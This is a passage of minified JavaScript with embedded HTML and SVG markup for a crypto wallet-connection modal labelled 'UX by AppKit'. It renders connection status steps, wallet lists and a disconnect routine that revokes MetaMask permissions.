          <svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path fill-rule="evenodd" clip-rule="evenodd" d="M5.81984 1.63C5.94662 1.66471 6.0653 1.72408 6.16912 1.80471C6.27293 1.88533 6.35983 1.98563 6.42484 2.09987C6.48986 2.21411 6.53171 2.34005 6.54801 2.47048C6.56431 2.60091 6.55474 2.73327 6.51984 2.86L6.03984 4.54C6.86768 4.10078 7.78892 3.86688 8.72602 3.85798C9.66312 3.84908 10.5886 4.06544 11.4247 4.48885C12.2607 4.91226 12.9828 5.53032 13.5301 6.29101C14.0775 7.0517 14.434 7.93275 14.5698 8.86C14.7791 10.3197 14.4304 11.8046 13.5932 13.0185C12.756 14.2325 11.4919 15.0861 10.0531 15.4092C8.61432 15.7323 7.10661 15.5011 5.83078 14.7617C4.55494 14.0223 3.60477 12.829 3.16984 11.42C3.13026 11.1801 3.17942 10.934 3.30813 10.7278C3.43684 10.5215 3.63628 10.3692 3.86915 10.2994C4.10202 10.2295 4.35236 10.2469 4.57335 10.3482C4.79434 10.4496 4.97084 10.6279 5.06984 10.85C5.30134 11.6136 5.76379 12.2867 6.39356 12.7767C7.02333 13.2666 7.78946 13.5494 8.58654 13.586C9.38362 13.6227 10.1725 13.4114 10.8445 12.9813C11.5166 12.5512 12.0389 11.9233 12.3395 11.1842C12.64 10.4451 12.7042 9.63094 12.523 8.85385C12.3419 8.07676 11.9244 7.3749 11.328 6.84485C10.7315 6.3148 9.9855 5.98261 9.19251 5.89399C8.39952 5.80538 7.59856 5.96468 6.89984 6.35L8.76984 6.88C9.01198 6.96339 9.21289 7.13651 9.33116 7.36366C9.44944 7.59081 9.47606 7.85468 9.40553 8.10087C9.33501 8.34707 9.17272 8.55682 8.95211 8.6869C8.73151 8.81697 8.46941 8.85746 8.21984 8.8L4.11984 7.65C3.86564 7.57775 3.65038 7.40782 3.52109 7.17735C3.3918 6.94687 3.35899 6.67459 3.42984 6.42L4.58984 2.32C4.62455 2.19322 4.68392 2.07453 4.76455 1.97072C4.84517 1.86691 4.94548 1.78001 5.05972 1.715C5.17395 1.64998 5.29989 1.60813 5.43032 1.59183C5.56075 1.57553 5.69311 1.5851 5.81984 1.62V1.63Z" fill="currentColor"/>
          </svg>
          ${o}
        </button>
      </div>
    `:h=`
      <div class="screen-content">
        ${d}
        <div class="screen-text">
          <h2 class="screen-title">${e}</h2>
          ${t?`<p class="screen-description">${t}</p>`:""}
        </div>
        ${s?`
          <button class="screen-button" onclick="handleRetryClick()">
            <svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path fill-rule="evenodd" clip-rule="evenodd" d="M5.81984 1.63C5.94662 1.66471 6.0653 1.72408 6.16912 1.80471C6.27293 1.88533 6.35983 1.98563 6.42484 2.09987C6.48986 2.21411 6.53171 2.34005 6.54801 2.47048C6.56431 2.60091 6.55474 2.73327 6.51984 2.86L6.03984 4.54C6.86768 4.10078 7.78892 3.86688 8.72602 3.85798C9.66312 3.84908 10.5886 4.06544 11.4247 4.48885C12.2607 4.91226 12.9828 5.53032 13.5301 6.29101C14.0775 7.0517 14.434 7.93275 14.5698 8.86C14.7791 10.3197 14.4304 11.8046 13.5932 13.0185C12.756 14.2325 11.4919 15.0861 10.0531 15.4092C8.61432 15.7323 7.10661 15.5011 5.83078 14.7617C4.55494 14.0223 3.60477 12.829 3.16984 11.42C3.13026 11.1801 3.17942 10.934 3.30813 10.7278C3.43684 10.5215 3.63628 10.3692 3.86915 10.2994C4.10202 10.2295 4.35236 10.2469 4.57335 10.3482C4.79434 10.4496 4.97084 10.6279 5.06984 10.85C5.30134 11.6136 5.76379 12.2867 6.39356 12.7767C7.02333 13.2666 7.78946 13.5494 8.58654 13.586C9.38362 13.6227 10.1725 13.4114 10.8445 12.9813C11.5166 12.5512 12.0389 11.9233 12.3395 11.1842C12.64 10.4451 12.7042 9.63094 12.523 8.85385C12.3419 8.07676 11.9244 7.3749 11.328 6.84485C10.7315 6.3148 9.9855 5.98261 9.19251 5.89399C8.39952 5.80538 7.59856 5.96468 6.89984 6.35L8.76984 6.88C9.01198 6.96339 9.21289 7.13651 9.33116 7.36366C9.44944 7.59081 9.47606 7.85468 9.40553 8.10087C9.33501 8.34707 9.17272 8.55682 8.95211 8.6869C8.73151 8.81697 8.46941 8.85746 8.21984 8.8L4.11984 7.65C3.86564 7.57775 3.65038 7.40782 3.52109 7.17735C3.3918 6.94687 3.35899 6.67459 3.42984 6.42L4.58984 2.32C4.62455 2.19322 4.68392 2.07453 4.76455 1.97072C4.84517 1.86691 4.94548 1.78001 5.05972 1.715C5.17395 1.64998 5.29989 1.60813 5.43032 1.59183C5.56075 1.57553 5.69311 1.5851 5.81984 1.62V1.63Z" fill="currentColor"/>
            </svg>
            ${o}
          </button>
        `:""}
      </div>
    `,u.innerHTML=h,requestAnimationFrame(()=>{u.style.opacity="1",u.style.transform="translateY(0)",requestAnimationFrame(()=>{rl()})}),u}function Cn(r){const e=Yt.querySelector(".status_text");e&&(e.textContent=r)}async function yYe(r,e,t,i){if(localStorage.setItem("lastConnectedWallet",r.info.icon),r.info.walletId==="walletconnect"){_Ye(r.info),await SYe(r,e,t,i);return}el();const n=Yt.querySelector("#confirmation_step #status-container");n&&(n.style.cssText=`
      display: flex;
      flex-direction: column;
      gap: 12px;
      transition: all 0.3s ease;
    `,n.innerHTML=""),Yt.querySelector("#confirmation_step").style.display="flex",setTimeout(()=>{rl()},100);try{Cn("Connecting Wallet");const s=Yt.querySelectorAll(".dot");s.forEach((a,c)=>{a.classList.remove("active"),c===0&&a.classList.add("active")}),Xc({type:"primary",title:"Processing...",description:"Opening wallet for connection",icon:r.info.icon}),await new Promise(a=>setTimeout(a,2e3)),Cn("Waiting for Approval"),s.forEach((a,c)=>{a.classList.remove("active"),c===1&&a.classList.add("active")}),Xc({type:"warning",title:"Continue in "+r.info.name,description:"Accept connection request in the wallet",icon:r.info.icon,showButton:!1});const o=await gYe(r,e,t);o.success&&(await new Promise(a=>setTimeout(a,500)),Cn("Connection Successful"),s.forEach((a,c)=>{a.classList.remove("active"),c===2&&a.classList.add("active")}),Xc({type:"success",title:"Approved",description:"Connection successful",icon:r.info.icon,showSuccess:!0}),setTimeout(()=>{G4(),i({provider:o.provider,walletAddress:o.accounts[0],name:r.info.name})},1500))}catch(s){console.error("Connection error:",s),Yt.querySelectorAll(".dot").forEach((a,c)=>{a.classList.remove("active"),c===0&&a.classList.add("active")}),Cn("Connection Failed"),Xc({type:"danger",title:"An authorization error occurred",description:"Please try again or choose another wallet",icon:r.info.icon,showButton:!0,buttonText:"Try again"})}}async function xYe(r){r&&r.disconnect&&await r.disconnect(),window.ethereum?.isMetaMask&&await window.ethereum.request({method:"wallet_revokePermissions",params:[{eth_accounts:{}}]})}async function Fie(r,e){return new Promise((t,i)=>{const n=Yt.querySelector("#modal_connect"),s=Yt.querySelector("#wallet-list-container");setTimeout(()=>{n.classList.add("active")},100);const o=Uie(),a=jie(o);s&&(s.innerHTML="",s.appendChild(a));const c=Yt.querySelector("#all_wallets_link");c&&c.addEventListener("click",()=>{DO()}),Yt.querySelectorAll(".wallet-link").forEach(l=>{l.id!=="all_wallets_link"&&l.addEventListener("click",async()=>{const u=parseInt(l.dataset.providerIndex);!isNaN(u)&&o[u]?await yYe(o[u],r,e,t):console.error("Provider not found for this wallet link")})})})}async function G4(){const r=Yt.querySelector("#modal_connect");r.classList.remove("active"),r.classList.remove("large"),r.classList.remove("small"),setTimeout(()=>{el(),Wie(),Cn("Available Wallets")},100)}async function CYe(r,e,t=!1){const i=Yt,n=await EYe(),s=document.createElement("div");t&&rx.querySelector("html").classList.add("dark"),s.innerHTML=`<style>${n}</style>
    <div id="modal_connect" class="modal-contentel">
        <div class="modal-connectel border border-[#D0D4F7] dark:bg-[#121313] bg-white dark:border-[#33394B] overflow-hidden w-full h-full rounded-4xl ">
            <div class="flex items-start w-full h-full">

                <div class="flex flex-col w-full h-full">
                    <div class="flex justify-between items-center p-4 w-full">

                        <div id="back_button" class="hover:bg-black/20 dark:hover:bg-white/20 flex justify-center items-center w-8 h-8 rounded-full transition-all duration-300 cursor-pointer" style="display: none;">
                            <svg width="9" height="14" viewBox="0 0 9 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M8.04 0.459999C8.22625 0.647362 8.33079 0.900814 8.33079 1.165C8.33079 1.42918 8.22625 1.68264 8.04 1.87L2.91 7L8.04 12.13C8.14468 12.2196 8.2297 12.33 8.28973 12.454C8.34975 12.5781 8.38348 12.7132 8.3888 12.8509C8.39412 12.9887 8.37091 13.126 8.32064 13.2543C8.27036 13.3826 8.1941 13.4992 8.09665 13.5966C7.9992 13.6941 7.88265 13.7704 7.75432 13.8206C7.626 13.8709 7.48867 13.8941 7.35095 13.8888C7.21323 13.8835 7.07809 13.8497 6.95403 13.7897C6.82997 13.7297 6.71965 13.6447 6.63 13.54L0.79 7.71C0.696272 7.61704 0.621877 7.50643 0.571109 7.38458C0.52034 7.26272 0.494202 7.13201 0.494202 7C0.494202 6.86799 0.52034 6.73728 0.571109 6.61542C0.621877 6.49356 0.696272 6.38296 0.79 6.29L6.63 0.459999C6.81736 0.273748 7.07081 0.169207 7.335 0.169207C7.59919 0.169207 7.85264 0.273748 8.04 0.459999Z" fill="currentColor"/>
                            </svg>
                        </div>
                        <div id="help_button" class="hover:bg-black/20 dark:hover:bg-white/20 flex justify-center items-center w-8 h-8 rounded-full transition-all duration-300 cursor-pointer">
                            <svg width="17" height="16" viewBox="0 0 17 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M9.01 5.66C8.85187 5.5241 8.64838 5.4527 8.44 5.46C8.2382 5.48642 8.05314 5.58607 7.92 5.74C7.77489 5.8762 7.68575 6.0616 7.67 6.26C7.67 6.52522 7.56464 6.77957 7.37711 6.96711C7.18957 7.15464 6.93522 7.26 6.67 7.26C6.40478 7.26 6.15043 7.15464 5.96289 6.96711C5.77536 6.77957 5.67 6.52522 5.67 6.26C5.67 5.51 6.01 4.83 6.48 4.35C6.85769 3.93636 7.3527 3.64791 7.89879 3.52326C8.44488 3.3986 9.01602 3.44368 9.53579 3.65246C10.0556 3.86124 10.4992 4.22376 10.8073 4.69154C11.1154 5.15931 11.2734 5.71002 11.26 6.27C11.26 7.51 10.46 8.13 10.01 8.47L9.97 8.5C9.5 8.86 9.47 8.93 9.47 9.15C9.47 9.41522 9.36464 9.66957 9.17711 9.85711C8.98957 10.0446 8.73522 10.15 8.47 10.15C8.20478 10.15 7.95043 10.0446 7.76289 9.85711C7.57536 9.66957 7.47 9.41522 7.47 9.15C7.47 7.9 8.27 7.29 8.71 6.95L8.75 6.91C9.22 6.55 9.25 6.48 9.25 6.26C9.25 5.96 9.15 5.77 9.01 5.66ZM9.62 11.87C9.63479 12.0267 9.61669 12.1847 9.56688 12.3339C9.51707 12.4832 9.43663 12.6204 9.33073 12.7367C9.22482 12.8531 9.09578 12.9461 8.95187 13.0097C8.80796 13.0733 8.65235 13.1062 8.495 13.1062C8.33765 13.1062 8.18204 13.0733 8.03813 13.0097C7.89422 12.9461 7.76517 12.8531 7.65927 12.7367C7.55337 12.6204 7.47293 12.4832 7.42312 12.3339C7.37331 12.1847 7.35521 12.0267 7.37 11.87C7.39643 11.5899 7.52638 11.3298 7.73444 11.1405C7.94249 10.9511 8.21369 10.8462 8.495 10.8462C8.77631 10.8462 9.04751 10.9511 9.25556 11.1405C9.46362 11.3298 9.59357 11.5899 9.62 11.87Z" fill="currentColor" />
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M0.5 8C0.5 5.87827 1.34285 3.84344 2.84315 2.34315C4.34344 0.842855 6.37827 0 8.5 0C10.6217 0 12.6566 0.842855 14.1569 2.34315C15.6571 3.84344 16.5 5.87827 16.5 8C16.5 10.1217 15.6571 12.1566 14.1569 13.6569C12.6566 15.1571 10.6217 16 8.5 16C6.37827 16 4.34344 15.1571 2.84315 13.6569C1.34285 12.1566 0.5 10.1217 0.5 8ZM8.5 2C7.71207 2 6.93185 2.15519 6.2039 2.45672C5.47595 2.75825 4.81451 3.20021 4.25736 3.75736C3.70021 4.31451 3.25825 4.97595 2.95672 5.7039C2.65519 6.43185 2.5 7.21207 2.5 8C2.5 8.78793 2.65519 9.56815 2.95672 10.2961C3.25825 11.0241 3.70021 11.6855 4.25736 12.2426C4.81451 12.7998 5.47595 13.2417 6.2039 13.5433C6.93185 13.8448 7.71207 14 8.5 14C10.0913 14 11.6174 13.3679 12.7426 12.2426C13.8679 11.1174 14.5 9.5913 14.5 8C14.5 6.4087 13.8679 4.88258 12.7426 3.75736C11.6174 2.63214 10.0913 2 8.5 2Z" fill="currentColor" />
                            </svg>
                        </div>
                        <p class="status_text font-bold dark:!text-white">Connect Wallet</p>
                        <div class="close_modal hover:bg-black/20 dark:text-[#E4E7E7]  dark:hover:bg-white/20 flex justify-center items-center w-8 h-8 rounded-full transition-all duration-300 cursor-pointer">
                            <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M1.04 0.54C1.13296 0.446272 1.24356 0.371877 1.36542 0.321109C1.48728 0.27034 1.61799 0.244202 1.75 0.244202C1.88201 0.244202 2.01272 0.27034 2.13458 0.321109C2.25644 0.371877 2.36704 0.446272 2.46 0.54L6.5 4.6L10.54 0.55C10.7283 0.361696 10.9837 0.255908 11.25 0.255908C11.5163 0.255908 11.7717 0.361696 11.96 0.55C12.1483 0.738304 12.2541 0.993698 12.2541 1.26C12.2541 1.5263 12.1483 1.7817 11.96 1.97L7.9 6L11.95 10.04C12.1383 10.2283 12.2441 10.4837 12.2441 10.75C12.2441 11.0163 12.1383 11.2717 11.95 11.46C11.7617 11.6483 11.5063 11.7541 11.24 11.7541C10.9737 11.7541 10.7183 11.6483 10.53 11.46L6.5 7.4L2.46 11.45C2.2717 11.6383 2.0163 11.7441 1.75 11.7441C1.4837 11.7441 1.2283 11.6383 1.04 11.45C0.851696 11.2617 0.745908 11.0063 0.745908 10.74C0.745908 10.4737 0.851696 10.2183 1.04 10.03L5.1 6L1.04 1.96C0.946272 1.86704 0.871877 1.75644 0.821109 1.63458C0.77034 1.51272 0.744202 1.38201 0.744202 1.25C0.744202 1.11799 0.77034 0.987283 0.821109 0.865423C0.871877 0.743564 0.946272 0.632963 1.04 0.54Z" fill="currentColor" />
                            </svg>

                        </div>
                    </div>
                    <div id="connect_wallet_step" class="flex flex-col gap-4 justify-start items-center w-full h-full">
                        <div class="flex flex-col gap-2 px-4 pt-4 w-full">
                            <div id="wallet-list-container" class="w-full"></div>
                            <div class="wallet-link" id="all_wallets_link">
                                <div class="flex gap-2 items-center h-full">
                                    <div class="h-10 w-10 rounded-xl flex justify-center items-center bg-[#667DFF]/10 dark:bg-[#222B35] border border-[#5773FF1A]">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="25" height="24" viewBox="0 0 25 24" fill="none">
                                            <path d="M10.7 6.6C10.7 7.55478 10.3207 8.47045 9.64558 9.14558C8.97045 9.82071 8.05478 10.2 7.1 10.2C6.14522 10.2 5.22955 9.82071 4.55442 9.14558C3.87928 8.47045 3.5 7.55478 3.5 6.6C3.5 5.64522 3.87928 4.72955 4.55442 4.05442C5.22955 3.37928 6.14522 3 7.1 3C8.05478 3 8.97045 3.37928 9.64558 4.05442C10.3207 4.72955 10.7 5.64522 10.7 6.6ZM21.5 6.6C21.5 7.55478 21.1207 8.47045 20.4456 9.14558C19.7705 9.82071 18.8548 10.2 17.9 10.2C16.9452 10.2 16.0295 9.82071 15.3544 9.14558C14.6793 8.47045 14.3 7.55478 14.3 6.6C14.3 5.64522 14.6793 4.72955 15.3544 4.05442C16.0295 3.37928 16.9452 3 17.9 3C18.8548 3 19.7705 3.37928 20.4456 4.05442C21.1207 4.72955 21.5 5.64522 21.5 6.6ZM10.7 17.4C10.7 18.3548 10.3207 19.2705 9.64558 19.9456C8.97045 20.6207 8.05478 21 7.1 21C6.14522 21 5.22955 20.6207 4.55442 19.9456C3.87928 19.2705 3.5 18.3548 3.5 17.4C3.5 16.4452 3.87928 15.5295 4.55442 14.8544C5.22955 14.1793 6.14522 13.8 7.1 13.8C8.05478 13.8 8.97045 14.1793 9.64558 14.8544C10.3207 15.5295 10.7 16.4452 10.7 17.4ZM21.5 17.4C21.5 18.3548 21.1207 19.2705 20.4456 19.9456C19.7705 20.6207 18.8548 21 17.9 21C16.9452 21 16.0295 20.6207 15.3544 19.9456C14.6793 19.2705 14.3 18.3548 14.3 17.4C14.3 16.4452 14.6793 15.5295 15.3544 14.8544C16.0295 14.1793 16.9452 13.8 17.9 13.8C18.8548 13.8 19.7705 14.1793 20.4456 14.8544C21.1207 15.5295 21.5 16.4452 21.5 17.4Z" fill="currentColor" />
                                        </svg>
                                    </div>


                                    <p>All Wallets</p>
                                </div>
                                <div class="dark:bg-white/10 uppercase text-[10px] bg-black/10 p-1.5 rounded-sm text-[#949E9E] font-bold" id="wallet-count">
                                    42
                                </div>
                            </div>
                        </div>
                        <p class="text-sm text-[#949E9E] inline-flex items-center gap-1">Haven't got a wallet? <a href="https://chromewebstore.google.com/" class="text-[#667DFF] font-bold">Get started</a></p>
                        <div class="dark:bg-white/5 bg-black/5 flex justify-center items-center py-4 w-full text-sm font-medium">
                            UX by AppKit
                        </div>
                    </div>
                    <div id="all_wallets_step" class="hidden flex-col gap-4 justify-start items-center py-3 w-full h-full">
                        <div class="flex gap-2 items-center px-3 w-full">
                            <div class="input-wrapper w-full">
                                <svg width="14" height="15" viewBox="0 0 14 15" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M6.55195 3.447C5.59677 3.447 4.68072 3.82644 4.0053 4.50185C3.32989 5.17727 2.95045 6.09332 2.95045 7.0485C2.95045 8.00368 3.32989 8.91973 4.0053 9.59514C4.68072 10.2706 5.59677 10.65 6.55195 10.65C7.50713 10.65 8.42318 10.2706 9.09859 9.59514C9.77401 8.91973 10.1534 8.00368 10.1534 7.0485C10.1534 6.09332 9.77401 5.17727 9.09859 4.50185C8.42318 3.82644 7.50713 3.447 6.55195 3.447ZM1.14795 7.052C1.14919 6.20329 1.35058 5.36685 1.73575 4.61058C2.12092 3.85431 2.67902 3.19953 3.36473 2.69943C4.05044 2.19933 4.84443 1.86799 5.68222 1.73232C6.52001 1.59665 7.37799 1.66048 8.18649 1.91862C8.99498 2.17676 9.7312 2.62194 10.3354 3.218C10.9395 3.81406 11.3946 4.54421 11.6636 5.34915C11.9326 6.15409 12.008 7.01113 11.8837 7.85067C11.7593 8.69022 11.4388 9.48861 10.9479 10.181L12.7119 11.931C12.7961 12.0147 12.8629 12.1141 12.9086 12.2235C12.9543 12.333 12.978 12.4504 12.9783 12.569C12.9786 12.6877 12.9556 12.8052 12.9105 12.9149C12.8654 13.0246 12.7991 13.1244 12.7155 13.2085C12.6318 13.2926 12.5324 13.3594 12.4229 13.4051C12.3135 13.4508 12.1961 13.4745 12.0774 13.4748C11.9588 13.4752 11.8413 13.4521 11.7315 13.407C11.6218 13.3619 11.5221 13.2957 11.4379 13.212L9.68095 11.455C8.87327 12.0297 7.92292 12.3709 6.93413 12.4411C5.94534 12.5113 4.95631 12.3078 4.07555 11.8529C3.19478 11.3981 2.4563 10.7095 1.94111 9.86257C1.42592 9.01569 1.15392 8.04328 1.15495 7.052H1.14795Z" fill="#788181" />
                                </svg>
                                <input type="text" placeholder="Search wallet" class="w-full">
                            </div>

                        </div>
                        <div id="all_wallets_grid" class="grid grid-cols-3 gap-8 min-h-[400px] max-h-[400px] overflow-y-auto  px-4">

                        </div>
                    </div>
                    <div id="what_is_wallet_step" class="hidden flex-col gap-8 justify-start items-center px-6 py-5 w-full h-full">
                        <div class="flex flex-col gap-4 items-center max-w-sm text-center">
                            <div class="flex flex-col gap-4 items-center">
                                <div class="flex gap-4 justify-center">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="56" height="55" viewBox="0 0 56 55" fill="none">
                                        <mask id="mask0_1_1620" style="mask-type:luminance" maskUnits="userSpaceOnUse" x="0" y="0" width="56" height="55">
                                            <path d="M0.5 0H55.5V55H0.5V0Z" fill="white" />
                                        </mask>
                                        <g mask="url(#mask0_1_1620)">
                                            <path d="M0.5 22.825C0.5 14.3458 0.5 10.1017 2.30583 6.93917C3.52618 4.79909 5.29909 3.02618 7.43917 1.80583C10.6017 0 14.8458 0 23.325 0H32.675C41.1542 0 45.3983 0 48.5608 1.80583C50.7009 3.02618 52.4738 4.79909 53.6942 6.93917C55.5 10.1017 55.5 14.3458 55.5 22.825V32.175C55.5 40.6542 55.5 44.8983 53.6942 48.0608C52.4738 50.2009 50.7009 51.9738 48.5608 53.1942C45.3983 55 41.1542 55 32.675 55H23.325C14.8458 55 10.6017 55 7.43917 53.1942C5.29909 51.9738 3.52618 50.2009 2.30583 48.0608C0.5 44.8983 0.5 40.6542 0.5 32.175V22.825Z" fill="#EB8B47" />
                                            <path d="M0.958375 22.825C0.958375 18.5717 0.958375 15.4183 1.17837 12.925C1.40754 10.45 1.84754 8.6625 2.70004 7.16833C3.88052 5.09655 5.59659 3.38047 7.66837 2.2C9.17171 1.3475 10.9409 0.916663 13.425 0.67833C16.7207 0.470953 20.0234 0.39756 23.325 0.45833H32.675C36.9192 0.45833 40.0817 0.45833 42.575 0.67833C45.05 0.907497 46.8375 1.3475 48.3317 2.2C50.4035 3.38047 52.1196 5.09655 53.3 7.16833C54.1525 8.6625 54.5925 10.4408 54.8217 12.925C55.0417 15.4183 55.0417 18.5717 55.0417 22.825V32.175C55.0417 36.4192 55.0417 39.5817 54.8217 42.075C54.5925 44.55 54.1525 46.3283 53.3 47.8317C52.1183 49.9001 50.4023 51.6129 48.3317 52.7908C46.8375 53.6525 45.0592 54.0925 42.575 54.3217C40.0817 54.5417 36.9192 54.5417 32.675 54.5417H23.325C19.0809 54.5417 15.9184 54.5417 13.425 54.3217C10.95 54.0925 9.17171 53.6525 7.66837 52.7908C5.59897 51.6154 3.88313 49.9059 2.70004 47.8408C1.84754 46.3192 1.41671 44.55 1.17837 42.0567C0.971494 38.7671 0.898101 35.4705 0.958375 32.175V22.825Z" stroke="#062B2B" stroke-opacity="0.1" stroke-width="0.916667" />
                                            <path d="M36.4334 26.7667C38.098 25.0993 39.231 22.9759 39.6892 20.6649C40.1474 18.3538 39.9102 15.9588 39.0077 13.7824C38.1052 11.6061 36.5778 9.74612 34.6185 8.43758C32.6593 7.12903 30.3561 6.43063 28 6.43063C25.644 6.43063 23.3408 7.12903 21.3816 8.43758C19.4223 9.74612 17.8949 11.6061 16.9924 13.7824C16.0898 15.9588 15.8527 18.3538 16.3109 20.6649C16.7691 22.9759 17.9021 25.0993 19.5667 26.7667L20.7584 27.94C21.4885 28.5875 22.1352 29.3235 22.6834 30.1308C22.9256 30.5536 23.1105 31.0068 23.2334 31.4783C23.4167 32.175 23.4167 32.9083 23.4167 34.3842V44.6875C23.4167 45.6775 23.4167 46.1633 23.5359 46.6308C23.6207 46.9457 23.7471 47.2478 23.9117 47.5292C24.15 47.9417 24.4984 48.29 25.195 48.9958L25.47 49.2617C26.0659 49.8575 26.3684 50.16 26.7167 50.2608C26.955 50.325 27.2117 50.325 27.45 50.2608C27.7984 50.16 28.0917 49.8575 28.6967 49.2525L31.8867 46.0717C32.4825 45.4758 32.785 45.1733 32.8859 44.825C32.9523 44.5851 32.9523 44.3316 32.8859 44.0917C32.7942 43.7433 32.4825 43.45 31.8775 42.845L31.4467 42.405C30.8509 41.8092 30.5484 41.5067 30.4475 41.1583C30.3812 40.9184 30.3812 40.6649 30.4475 40.425C30.5392 40.0767 30.8509 39.7833 31.4559 39.1783L31.8867 38.7383C32.4825 38.1425 32.785 37.84 32.8859 37.4917C32.9523 37.2517 32.9523 36.9983 32.8859 36.7583C32.7942 36.41 32.4825 36.1167 31.8775 35.5117L31.4375 35.0533C30.8417 34.4667 30.5392 34.1642 30.4475 33.8158C30.3828 33.5788 30.3828 33.3287 30.4475 33.0917C30.5392 32.7433 30.8325 32.45 31.4192 31.845L36.4242 26.7575L36.4334 26.7667Z" fill="#FF974C" stroke="white" stroke-width="1.83333" />
                                            <path d="M28 19.25C30.0251 19.25 31.6667 17.6084 31.6667 15.5833C31.6667 13.5583 30.0251 11.9167 28 11.9167C25.975 11.9167 24.3334 13.5583 24.3334 15.5833C24.3334 17.6084 25.975 19.25 28 19.25Z" fill="#EB8B47" stroke="white" stroke-width="1.83333" />
                                        </g>
                                    </svg>

                                    <svg xmlns="http://www.w3.org/2000/svg" width="56" height="55" viewBox="0 0 56 55" fill="none">
                                        <mask id="mask0_1_1630" style="mask-type:luminance" maskUnits="userSpaceOnUse" x="0" y="0" width="56" height="55">
                                            <path d="M55.5 27.5C55.5 12.3122 43.1878 0 28 0C12.8122 0 0.5 12.3122 0.5 27.5C0.5 42.6878 12.8122 55 28 55C43.1878 55 55.5 42.6878 55.5 27.5Z" fill="white" />
                                        </mask>
                                        <g mask="url(#mask0_1_1630)">
                                            <path d="M55.5 27.5C55.5 12.3122 43.1878 0 28 0C12.8122 0 0.5 12.3122 0.5 27.5C0.5 42.6878 12.8122 55 28 55C43.1878 55 55.5 42.6878 55.5 27.5Z" fill="#00ACE6" />
                                            <path d="M54.5833 66.9167C54.5833 81.5983 42.6816 93.5 28 93.5C13.3184 93.5 1.41663 81.5983 1.41663 66.9167C1.41663 52.2351 11.5 40.3333 28 40.3333C44.5 40.3333 54.5833 52.2351 54.5833 66.9167Z" fill="#1AC6FF" stroke="white" stroke-width="1.83333" />
                                            <path d="M17.6328 18.243C18.4908 14.0512 21.901 10.8575 26.1398 10.2755C27.3795 10.1053 28.6188 10.1051 29.8598 10.2755C34.0987 10.8575 37.5088 14.0512 38.3669 18.243C38.5295 19.0374 38.6616 19.8467 38.77 20.6498C38.891 21.5454 38.891 22.4532 38.77 23.3489C38.6616 24.152 38.5295 24.9612 38.3669 25.7556C37.5088 29.9474 34.0987 33.1412 29.8598 33.7232C28.6207 33.8932 27.3781 33.8931 26.1398 33.7232C21.901 33.1412 18.4908 29.9474 17.6328 25.7556C17.4702 24.9612 17.3381 24.152 17.2297 23.3489C17.1087 22.4532 17.1087 21.5454 17.2297 20.6498C17.3381 19.8467 17.4702 19.0374 17.6328 18.243Z" fill="#1AC6FF" stroke="white" stroke-width="1.83333" />
                                            <path d="M22.9584 22.9167C23.7178 22.9167 24.3334 22.3011 24.3334 21.5417C24.3334 20.7823 23.7178 20.1667 22.9584 20.1667C22.199 20.1667 21.5834 20.7823 21.5834 21.5417C21.5834 22.3011 22.199 22.9167 22.9584 22.9167Z" fill="white" />
                                            <path d="M33.0416 22.9167C33.801 22.9167 34.4166 22.3011 34.4166 21.5417C34.4166 20.7823 33.801 20.1667 33.0416 20.1667C32.2822 20.1667 31.6666 20.7823 31.6666 21.5417C31.6666 22.3011 32.2822 22.9167 33.0416 22.9167Z" fill="white" />
                                            <path d="M28.9166 18.3333L26.1666 25.6667H29.8333" stroke="white" stroke-width="1.83333" stroke-linecap="round" stroke-linejoin="round" />
                                        </g>
                                        <path d="M55.0417 27.5C55.0417 12.5653 42.9347 0.458336 28 0.458336C13.0653 0.458336 0.958374 12.5653 0.958374 27.5C0.958374 42.4347 13.0653 54.5417 28 54.5417C42.9347 54.5417 55.0417 42.4347 55.0417 27.5Z" stroke="white" stroke-opacity="0.1" stroke-width="0.916667" />
                                    </svg>
                                    <svg xmlns="http://www.w3.org/2000/svg" width="56" height="55" viewBox="0 0 56 55" fill="none">
                                        <path d="M52.75 0H3.25C1.73122 0 0.5 1.23122 0.5 2.75V52.25C0.5 53.7688 1.73122 55 3.25 55H52.75C54.2688 55 55.5 53.7688 55.5 52.25V2.75C55.5 1.23122 54.2688 0 52.75 0Z" fill="#C653C6" />
                                        <path d="M18.8608 13.9517C18.8333 14.3 18.8333 14.7308 18.8333 15.5833V18.15C18.8333 19.195 18.8333 19.7083 18.65 20.0933C18.5125 20.3775 18.375 20.5517 18.1183 20.7442C17.7791 21.0008 17.1466 21.1292 15.8908 21.3858C15.35 21.4958 14.8733 21.6517 14.4241 21.8533C12.6663 22.6752 11.2544 24.0903 10.4366 25.85C9.66663 27.5 9.66663 29.645 9.66663 33.9167C9.66663 38.1883 9.66663 40.3333 10.4366 41.9833C11.2567 43.7446 12.672 45.1599 14.4333 45.98C16.0833 46.75 18.2283 46.75 22.5 46.75H33.5C37.7716 46.75 39.9166 46.75 41.5666 45.98C43.3279 45.1599 44.7432 43.7446 45.5633 41.9833C46.3333 40.3333 46.3333 38.1883 46.3333 33.9167C46.3333 29.645 46.3333 27.5 45.5633 25.85C44.7432 24.0887 43.3279 22.6734 41.5666 21.8533C41.1266 21.6517 40.65 21.4958 40.1 21.395C38.8533 21.1292 38.2208 21.0008 37.8816 20.7533C37.6341 20.5517 37.4875 20.3867 37.35 20.0933C37.1666 19.7083 37.1666 19.195 37.1666 18.1592V15.5833C37.1666 14.7308 37.1666 14.3 37.1391 13.9517C36.9716 12.0168 36.1268 10.2031 34.7535 8.82977C33.3802 7.45649 31.5665 6.61171 29.6316 6.44416C29.2833 6.41666 28.8525 6.41666 28 6.41666C27.1475 6.41666 26.7166 6.41666 26.3683 6.44416C24.4334 6.61171 22.6197 7.45649 21.2464 8.82977C19.8731 10.2031 19.0283 12.0168 18.8608 13.9517Z" fill="white" />
